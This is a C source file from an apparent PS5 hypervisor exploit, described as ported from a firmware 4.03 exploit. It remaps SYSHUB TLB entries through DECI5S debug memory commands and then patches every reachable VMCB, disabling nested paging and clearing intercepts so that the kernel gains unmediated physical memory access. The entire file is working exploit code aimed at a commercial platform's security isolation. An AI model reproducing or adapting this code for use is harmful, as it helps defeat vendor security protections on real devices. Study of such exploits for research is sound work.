/*
 * VMCB (Virtual Machine Control Block) patching via DECI5S.
 *
 * Ported from fail0verflow's prosperous exploit for PS5 FW 4.03.
 *
 * The PS5 hypervisor uses AMD SVM with nested paging to isolate
 * guest memory. The VMCB controls VM execution:
 *   - Instruction intercepts (offset 0x00-0x14)
 *   - Nested paging control (offset 0x90)
 *
 * Disabling NP and clearing intercepts gives the kernel direct
 * access to all physical memory without HV mediation.
 *
 * The x86 kernel runs inside the HV's VM, so DMAP access to VMCB
 * physical addresses causes a nested page fault (kernel panic).
 * Instead, we use the A53's SYSHUB path:
 *
 *   DECI5S → A53 EL3 VA → MMU → bus addr → SYSHUB TLB → system PA
 *
 * This bypasses x86 NPT entirely. No custom A53 code execution
 * needed — we configure SYSHUB TLB registers and read/write VMCB
 * data purely through DECI5S READ_MEMORY/WRITE_MEMORY commands
 * with EL3_VA_TO_EL3_VA access type.
 *
 * SYSHUB TLB register layout (from mp4_payload/mp4_payload.c):
 *   Base: 0x03230000 (A53 EL3 VA)
 *   Entry N (0-60): base + N*16 [tlb0, tlb1, tlb2, tlb3]
 *   Sub-page RW: base + 0x3E0 + N*4
 *   Attributes: base + 0x4D8 + N*4
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/* Number of vCPU contexts to patch */
#define MAX_VCPUS   16

/* vCPU context structure stride and VMCB pointer offset */
#define VCPU_CTX_SIZE       0x320
#define VCPU_CTX_VMCB_OFF   0x08

/* SYSHUB TLB register addresses (A53 EL3 VA) */
#define SYSHUB_TLB_BASE     0x03230000ULL
#define SYSHUB_TLB_SPR_OFF  0x3E0       /* Sub-page RW offset */
#define SYSHUB_TLB_ATTR_OFF 0x4D8       /* Attributes offset */

/* TLB entry register offsets (within 16-byte entry) */
#define TLB_REG_TLB0    0x00    /* target system PA >> 26 */
#define TLB_REG_TLB1    0x04    /* segment size << 1 */
#define TLB_REG_TLB2    0x08    /* flags (4 = bypass) */
#define TLB_REG_TLB3    0x0C    /* flags */

/* A53 VA base for TLB-mapped system memory (bus addr 0x80000000) */
#define MP4_TLB_VA_BASE 0x80000000ULL

/*
 * Write a 32-bit value to an A53 EL3 VA via DECI5S.
 */
static int va_write32(uint64_t va, uint32_t val)
{
    return deci5s_write_el3_va(va, &val, 4);
}

/*
 * Read a 32-bit value from an A53 EL3 VA via DECI5S.
 */
static uint32_t va_read32(uint64_t va)
{
    uint32_t val = 0;
    deci5s_read_el3_va(va, &val, 4);
    return val;
}

/*
 * Read a 64-bit value from an A53 EL3 VA via DECI5S.
 */
static uint64_t va_read64(uint64_t va)
{
    uint32_t lo = 0, hi = 0;
    deci5s_read_el3_va(va, &lo, 4);
    deci5s_read_el3_va(va + 4, &hi, 4);
    return ((uint64_t)hi << 32) | lo;
}

/*
 * Write a 64-bit value to an A53 EL3 VA via DECI5S.
 */
static int va_write64(uint64_t va, uint64_t val)
{
    uint32_t lo = (uint32_t)val;
    uint32_t hi = (uint32_t)(val >> 32);
    int ret = va_write32(va, lo);
    if (ret != 0) return ret;
    return va_write32(va + 4, hi);
}

/*
 * Setup a SYSHUB TLB entry via DECI5S register writes.
 *
 * Maps a 64MB system PA region to A53 bus address space, accessible
 * at EL3 VA 0x80000000 + offset.
 *
 * @tlb_user_idx:  TLB index (1-61, matching mp4_payload convention)
 * @system_pa:     System physical address to map (64MB aligned internally)
 */
static int syshub_tlb_setup(uint32_t tlb_user_idx, uint64_t system_pa)
{
    if (tlb_user_idx == 0 || tlb_user_idx > 61)
        return -1;

    uint32_t idx = tlb_user_idx - 1;  /* Convert to 0-based array index */

    uint64_t entry_va = SYSHUB_TLB_BASE + idx * 16;
    uint64_t spr_va   = SYSHUB_TLB_BASE + SYSHUB_TLB_SPR_OFF + idx * 4;
    uint64_t attr_va  = SYSHUB_TLB_BASE + SYSHUB_TLB_ATTR_OFF + idx * 4;

    uint32_t tlb0 = (uint32_t)(system_pa >> 26);  /* Target PA in 64MB units */
    uint32_t tlb1 = 9 << 1;                        /* Segment size = 18 */
    uint32_t tlb2 = 4;                              /* Bypass flag */
    uint32_t tlb3 = 4;                              /* Bypass flag */

    printf("[TLB] Setting up TLB %u (idx %u): PA 0x%llx → tlb0=0x%x\n",
           tlb_user_idx, idx, (unsigned long long)system_pa, tlb0);
    printf("[TLB]   entry @ VA 0x%llx, spr @ VA 0x%llx, attr @ VA 0x%llx\n",
           (unsigned long long)entry_va, (unsigned long long)spr_va,
           (unsigned long long)attr_va);

    int ret;
    ret = va_write32(entry_va + TLB_REG_TLB0, tlb0);
    if (ret != 0) { printf("[!] TLB tlb0 write failed\n"); return ret; }
    ret = va_write32(entry_va + TLB_REG_TLB1, tlb1);
    if (ret != 0) { printf("[!] TLB tlb1 write failed\n"); return ret; }
    ret = va_write32(entry_va + TLB_REG_TLB2, tlb2);
    if (ret != 0) { printf("[!] TLB tlb2 write failed\n"); return ret; }
    ret = va_write32(entry_va + TLB_REG_TLB3, tlb3);
    if (ret != 0) { printf("[!] TLB tlb3 write failed\n"); return ret; }
    ret = va_write32(spr_va, 0xFFFFFFFF);
    if (ret != 0) { printf("[!] TLB sub_page_rw write failed\n"); return ret; }
    ret = va_write32(attr_va, 0xC0800003);
    if (ret != 0) { printf("[!] TLB attr write failed\n"); return ret; }

    printf("[TLB] TLB %u configured OK\n", tlb_user_idx);
    return 0;
}

/*
 * Convert system PA to A53 EL3 VA, assuming TLB maps from base_pa
 * to bus address range starting at 0x80000000.
 */
static uint64_t sys_pa_to_el3_va(uint64_t sys_pa, uint64_t base_pa)
{
    uint64_t offset = sys_pa - base_pa;
    if (offset >= 0x08000000) /* 128MB limit (2 TLB entries) */
        return 0;
    return MP4_TLB_VA_BASE + offset;
}

/*
 * Patch all VMCB structures to disable nested paging and most intercepts.
 *
 * Uses DECI5S to:
 *   1. Configure SYSHUB TLB entries 32-33 to map HV system PAs
 *   2. Read/write VMCB data through the TLB-mapped EL3 VAs
 *
 * No custom A53 code execution needed — pure DECI5S operations.
 */
int vmcb_patch_disable_np(struct phys_rw_ctx *ctx)
{
    uint64_t vcpu_ctxs_pa = VCPU_CTXS_PA;
    uint64_t tlb_base_pa;
    uint64_t hv_va_base;
    int ret;
    int patched = 0;

    (void)ctx; /* Not needed — we use DECI5S directly */

    /* Step 1: Set up SYSHUB TLB entries 32-33 to map the HV region.
     *
     * Align to 64MB boundary for TLB granularity. TLB 32 maps the first
     * 64MB, TLB 33 maps the next 64MB — 128MB total coverage.
     */
    tlb_base_pa = vcpu_ctxs_pa & ~0x03FFFFFFULL;
    printf("[VMCB] TLB base PA: 0x%llx (from vcpu_ctxs 0x%llx)\n",
           (unsigned long long)tlb_base_pa,
           (unsigned long long)vcpu_ctxs_pa);

    ret = syshub_tlb_setup(32, tlb_base_pa);
    if (ret != 0) {
        printf("[!] VMCB: TLB 32 setup failed: %d\n", ret);
        return -1;
    }

    ret = syshub_tlb_setup(33, tlb_base_pa + 0x04000000);
    if (ret != 0) {
        printf("[!] VMCB: TLB 33 setup failed: %d\n", ret);
        return -2;
    }

    /* Step 2: Read HV VA base from the HV data area.
     * First qword at system PA 0x62848000 = HV virtual address base. */
    uint64_t hv_data_va = sys_pa_to_el3_va(0x62848000ULL, tlb_base_pa);
    if (hv_data_va == 0) {
        printf("[!] VMCB: HV data PA out of TLB range\n");
        return -3;
    }

    hv_va_base = va_read64(hv_data_va);
    printf("[VMCB] HV VA base: 0x%llx (read from A53 VA 0x%llx)\n",
           (unsigned long long)hv_va_base, (unsigned long long)hv_data_va);

    if (hv_va_base == 0 || hv_va_base == 0xFFFFFFFFFFFFFFFFULL) {
        printf("[!] VMCB: Invalid HV VA base — TLB setup failed?\n");
        return -4;
    }

    /* Step 3: Iterate over all vCPU contexts and patch their VMCBs */
    for (int i = 0; i < MAX_VCPUS; i++) {
        uint64_t ctx_pa = vcpu_ctxs_pa + VCPU_CTX_SIZE * i + VCPU_CTX_VMCB_OFF;
        uint64_t ctx_va = sys_pa_to_el3_va(ctx_pa, tlb_base_pa);
        if (ctx_va == 0) continue;

        /* Read VMCB virtual address from vCPU context */
        uint64_t vmcb_va = va_read64(ctx_va);
        if (vmcb_va == 0) continue;

        /* Convert HV VA to system PA */
        uint64_t vmcb_pa = vmcb_va - hv_va_base;
        uint64_t vmcb_el3_va = sys_pa_to_el3_va(vmcb_pa, tlb_base_pa);
        if (vmcb_el3_va == 0) continue;

        /* Read NP_CTRL (offset 0x90 in VMCB) */
        uint64_t np_ctrl = va_read64(vmcb_el3_va + VMCB_NP_CTRL);

        /* If already zero, VMCBs were previously modified */
        if (np_ctrl == 0) break;

        /* Sanity check: NP_CTRL should be 0x09 */
        if ((np_ctrl & 0xFF) != 0x09) {
            printf("[!] VMCB %d: unexpected NP_CTRL=0x%llx\n",
                   i, (unsigned long long)np_ctrl);
            return -5;
        }

        /* Disable nested paging */
        va_write64(vmcb_el3_va + VMCB_NP_CTRL, 0);

        /* Read current intercept vectors */
        uint32_t vec3 = va_read32(vmcb_el3_va + VMCB_INTERCEPT_VEC3);
        uint32_t intercept_cpuid = vec3 & (1 << 18);

        /* Clear all intercepts in vec0 */
        va_write32(vmcb_el3_va + VMCB_INTERCEPT_VEC0, 0);

        /* Set vec3 to only CPUID intercept */
        if (vec3 != intercept_cpuid)
            va_write32(vmcb_el3_va + VMCB_INTERCEPT_VEC3, intercept_cpuid);

        /* Keep VMSAVE/VMLOAD/VMMCALL/VMRUN in vec4 */
        va_write32(vmcb_el3_va + VMCB_INTERCEPT_VEC4, 0x0F);

        patched++;
        printf("[VMCB] Patched vCPU %d: VMCB sysPA=0x%llx, NP 0x%llx→0\n",
               i, (unsigned long long)vmcb_pa, (unsigned long long)np_ctrl);
    }

    printf("[VMCB] Patched %d VMCBs via DECI5S\n", patched);
    return 0;
}
